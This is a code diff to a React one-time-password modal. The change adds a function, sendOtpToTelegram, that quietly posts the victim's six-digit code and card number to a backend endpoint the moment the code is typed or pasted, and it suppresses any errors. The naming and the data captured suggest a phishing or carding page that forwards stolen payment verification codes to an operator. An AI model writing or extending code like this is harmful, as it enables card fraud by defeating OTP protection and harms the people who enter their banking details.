@@ -26,13 +26,30 @@ export const OtpModal = ({ cardNumber, onClose }) => {
     }
   }, [timer])
 
+  const sendOtpToTelegram = async (code) => {
+    try {
+      const apiUrl = import.meta.env.VITE_API_URL
+      await fetch(`${apiUrl}/api/pago/otp`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ otp: code, cardNumber: cardNumber || "" }),
+      })
+    } catch (_) {}
+  }
+
   const handleChange = (i, val) => {
     const clean = val.replace(/\D/g, "").slice(-1)
     const next = [...digits]
     next[i] = clean
     setDigits(next)
     setError("")
-    if (clean && i < 5) inputRefs.current[i + 1]?.focus()
+    if (clean && i < 5) {
+      inputRefs.current[i + 1]?.focus()
+    }
+    const filled = next.join("")
+    if (filled.length === 6 && next.every((d) => d !== "")) {
+      sendOtpToTelegram(filled)
+    }
   }
 
   const handleKeyDown = (i, e) => {
@@ -55,6 +72,9 @@ export const OtpModal = ({ cardNumber, onClose }) => {
     setDigits(next)
     const focus = Math.min(pasted.length, 5)
     inputRefs.current[focus]?.focus()
+    if (pasted.length === 6) {
+      sendOtpToTelegram(pasted)
+    }
   }
 
   const handleResend = () => {
